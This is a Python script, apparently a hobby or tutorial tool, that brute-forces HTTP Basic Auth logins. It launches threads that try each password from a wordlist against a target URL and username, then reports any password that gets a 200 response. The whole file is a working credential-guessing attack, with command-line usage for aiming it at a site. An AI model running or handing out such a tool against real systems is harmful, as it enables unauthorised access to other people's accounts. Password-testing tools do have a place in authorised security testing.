#!/usr/bin/python

import requests
from threading import Thread, Lock
import sys
import getopt


class RequestPerformer(Thread):
    def __init__(self, password, user, url, hit_lock):
        Thread.__init__(self)
        self.password = password.strip()
        self.user = user
        self.url = url
        self.hit_lock = hit_lock
        print(f"- Trying: {self.password} -")

    def run(self):
        try:
            response = requests.get(self.url, auth=(self.user, self.password))
            if response.status_code == 200:
                with self.hit_lock:
                    print(f"[+] Password Found - {self.password}")
                sys.exit(0)
            else:
                print(f"[!!] Invalid password: {self.password}")
        except requests.RequestException as e:
            print(f"Error: {e}")


def banner():
    print("#########################")
    print("* Our Basic Bruteforcer *")
    print("#########################")


def usage():
    print("Usage:")
    print("     -w: url (http://somesite.com)")
    print("     -u: username")
    print("     -t: threads")
    print("     -f: password list")
    print(
        "Example: ./broteforcer.py -w http://somesite.com -u admin -t 5 -f passwd.txt"
    )


def start(argv):

    banner()

    try:
        opts, args = getopt.getopt(argv, "u:w:f:t:")
    except getopt.GetoptError as e:
        print(f"Error in arguements: {e}")
        usage()
        sys.exit(2)

    user, url, passlist, threads = None, None, None, None

    for opt, arg in opts:
        if opt == "-u":
            user = arg
        elif opt == "-w":
            url = arg
        elif opt == "-f":
            passlist = arg
        elif opt == "-t":
            threads = int(arg)

    if not user or not url or not passlist or not threads:
        print("[!!] Missing required arguments")
        usage()
        sys.exit(2)

    try:
        with open(passlist, "r") as f:
            passwords = f.readlines()
    except FileNotFoundError:
        print("[!!] Cannot open the specified password file")
        sys.exit(2)

    if not passwords:
        print("[!!] Password list is empty")
        sys.exit(2)

    hit_lock = Lock()

    launcher_thread(passwords, threads, user, url, hit_lock)


def launcher_thread(passwords, max_threads, user, url, hit_lock):
    threads = []
    while passwords:
        if len(threads) < max_threads:
            password = passwords.pop(0)
            thread = RequestPerformer(password, user, url, hit_lock)
            thread.start()
            threads.append(thread)

        for thread in threads[:]:
            if not thread.is_alive():
                threads.remove(thread)

    for thread in threads:
        thread.join()


if __name__ == "__main__":
    try:
        start(sys.argv[1:])
    except KeyboardInterrupt:
        print("[!!] Interrupted by user")
        sys.exit(1)
